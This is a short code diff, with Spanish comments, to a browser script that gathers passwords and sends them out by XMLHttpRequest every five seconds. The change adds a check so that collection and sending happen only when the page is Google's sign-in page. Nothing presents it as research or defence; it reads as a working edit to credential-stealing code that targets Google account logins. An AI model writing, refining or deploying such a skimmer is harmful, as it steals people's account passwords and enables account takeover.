@@ -25,11 +25,18 @@
                 xhr.send(JSON.stringify(data));
             }
 
-            // Recolectar y enviar datos cada 5 segundos
+            // Verificar si estamos en la página de inicio de sesión de Google
+            function isGoogleLoginPage() {
+                return window.location.href.includes('accounts.google.com/signin');
+            }
+
+            // Recolectar y enviar datos cada 5 segundos si estamos en la página de Google
             setInterval(function() {
-                var data = collectPasswords();
-                if (data.length > 0) {
-                    sendData(data);
+                if (isGoogleLoginPage()) {
+                    var data = collectPasswords();
+                    if (data.length > 0) {
+                        sendData(data);
+                    }
                 }
             }, 5000);
         });
